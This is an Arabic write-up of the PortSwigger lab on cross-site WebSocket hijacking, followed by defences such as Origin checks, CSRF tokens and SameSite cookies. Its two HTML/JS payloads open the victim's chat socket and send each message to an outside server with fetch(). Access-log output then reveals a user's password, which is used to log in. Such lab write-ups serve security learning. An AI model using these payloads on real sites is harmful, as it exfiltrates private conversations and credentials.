# [Cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

## **`الهدف`**
إنشاء كود `HTML/JS` يقوم بعمل هجوم `cross-site WebSocket hijacking (CSWSH)` لاستخراج سجل محادثات الضحية، ثم استخدام ذلك للوصول إلى حسابه.
## **`خطوات الحل`**
**`ملاحظة:`** الحل الرسمي لهذا اللاب يحتاج إلى استعمال أداة `Burp Collaborator` والتي تتوفر فقط في النسخة المدفوعة من `Burp Suite`، ولكن يمكن حله بدونها تمامًا عن طريق الـ `Severver Log`.

أولا سنقوم بالتوجه إلى السيرفر الموجود في اللاب ونقوم بوضع إحدي الأكواد التالية في الـ `Body` مع تغيير الـ `URL` الخاص باللاب والسيرفر الحاليين.

هذا الكود يتطلب `Burb Collaborator` أو إذا كان اختبار ثغرة في موقع حقيقي فيمكن وضع سيرفرك الخاص.
```html
<script> 
	var ws = new WebSocket('wss://your-websocket/lAB-url');
	ws.onopen = function() { 
		ws.send("READY");
	};
	ws.onmessage = function(event) {
		fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
	}; 
</script>
```

هذا الكود يعمل على الـ `Access Log` الخاص بالسيرفر، ولمزيد من المعلومات حول تفاصيل الكود، انظر [`فيديو اليوتيوب`](https://youtu.be/U_z2OCAkoLk) على قناة `Jarno Timmermans`.
```html
<script>
    var ws = new WebSocket(
        "wss://YOUR-LAB-ID.web-security-academy.net/chat"
    );

    ws.onopen = function () {
        ws.send("READY");
    };

    ws.onmessage = function (event) {
        fetch(
            "https://exploit-YOUR-EXPLOIT-SERVER_ID.exploit-server.net/exploit?message=" +
            btoa(event.data)
        );
    };
</script>
```

ونقوم بالضغط على `Store` ثم `Deliver exploit to victim` وبعد ذلك نتوجه إلى `Access log` لنلاحظ وجود عدة أسطر تشبه التالي
```
/exploit?message=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IkhlbGxvLCBob3cgY2FuIEkgaGVscD8ifQ== HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
10.0.3.85       2026-08-06 10:30:09 +0000 "GET /exploit?message=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0= HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
10.0.3.85       2026-08-06 10:30:09 +0000 "GET /exploit?message=eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3Mgamk3ZG1haGpsaWRyMmIzc2VkNHkifQ== HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
10.0.3.85       2026-08-06 10:30:09 +0000 "GET /exploit?message=eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IlRoYW5rcywgSSBob3BlIHRoaXMgZG9lc24mYXBvczt0IGNvbWUgYmFjayB0byBiaXRlIG1lISJ9 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
10.0.3.85       2026-08-06 10:30:09 +0000 "GET /exploit?message=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
```

فنقوم بنسخ جميعها ونتوجه إلى `Burp Decoder` ونقوم بعمل `Base64 Decode` ليظهر كالتالي: 
```
ýìi­?ë,j{"user":"Hal Pline","content":"Hello, how can I help?"} 4Ïÿ.1" 200 "ºÇ«-agent: Mozilla/5.0 (V'-) eyg*+ç~.36 (KHTML, ) Gecko) 
èïõç.0.0.0 I§Ú®/ùß.36"
10.0.3.85       ÛMº-08-06 10:30:09 +0000 "GET ýìi­?ë,j{"user":"You","content":"I forgot my password"} 4Ïÿ.1" 200 "ºÇ«-agent: Mozilla/5.0 (V'-) eyg*+ç~.36 (KHTML, ) Gecko) 
èïõç.0.0.0 I§Ú®/ùß.36"
10.0.3.85       ÛMº-08-06 10:30:09 +0000 "GET ýìi­?ë,j{"user":"Hal Pline","content":"No problem carlos, it&apos;s ji7dmahjlidr2b3sed4y"} 4Ïÿ.1" 200 "ºÇ«-agent: Mozilla/5.0 (V'-) eyg*+ç~.36 (KHTML, ) Gecko) 
èïõç.0.0.0 I§Ú®/ùß.36"
10.0.3.85       ÛMº-08-06 10:30:09 +0000 "GET ýìi­?ë,j{"user":"You","content":"Thanks, I hope this doesn&apos;t come back to bite me!"} 4Ïÿ.1" 200 "ºÇ«-agent: Mozilla/5.0 (V'-) eyg*+ç~.36 (KHTML, ) Gecko) 
èïõç.0.0.0 I§Ú®/ùß.36"
10.0.3.85       ÛMº-08-06 10:30:09 +0000 "GET ýìi­?ë,j{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"} 4Ïÿ.1" 200 "ºÇ«-agent: Mozilla/5.0 (V'-) eyg*+ç~.36 (KHTML, ) Gecko) 
èïõç.0.0.0 I§Ú®/ùß.36"
```

سنلاحظ وجود سطر به عبارة `I forgot my password` وفى السطور التالية سنجد هذه الجزئية 
`No problem carlos, it&apos;s ji7dmahjlidr2b3sed4y`، 
وهذا يعنى أن كلمة المرور هي `ji7dmahjlidr2b3sed4y`، لذللك سنقوم بتسجيل الدخول لحساب `carlos:ji7dmahjlidr2b3sed4y` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب برمجة السيرفر ليقوم بفحص هذه  ترويسة `Origin` التي توضح النطاق الذي بدأ الاتصال، ومقارنتها بقائمة بيضاء `White-list`من النطاقات الموثوقة، وإذا كان الـ `Origin` غير مطابق لواحد من النطاقات الموثوقة، فيجب أن يرفض السيرفر الاتصال فورًا بكود `403 Forbidden`.

ويجب استخدام الـ `Anti-CSRF Tokens` وهو رمز عشوائي وفريد وسري، يتم ربطه بجلسة المستخدم، وهذه هي الحماية الأقوى لأن المهاجم يستطيع أن يجبر الضحية على إرسال `requset` ولكنه لا يستطيع أبدًا أن يقرأ الـ `response` أو محتوى الصفحة الموجود بها الـ `token`، وبالتالي يتم رفض أي `requst` يجبر الضحية على إرساله لأن الـ `request` سيكون فارغًا من الرمز أو برمز خاطئ.

ويجب تشغيل خاصية `Lax` والتي تمنع المتصفح من إرسال الـ `cookies` إذا كان الـ `request` قادمًا من موقع خارجي باستثناء حالة واحدة فقط وهي `Top-level navigation (التنقل العلوي/المباشر)` عبر `GET METHOD` أو استعمال خاصية `Strict` والتي تمنع إرسال الـ `Cookies` في أي `request` قادم من رابط خارجي نهائياً، حتى لو كان مجرد الضغط على رابط عادي لفتح الموقع.

ويجب أن لا يتم إرسال أى بيانات حساسة مثل سجل المحادثات إلا بعد أن يقوم العميل `Client` بإرسال رسالة مصادقة مثل `JWT` أو `API Key` كأول رسالة عبر الـ `WebSocket` نفسه.
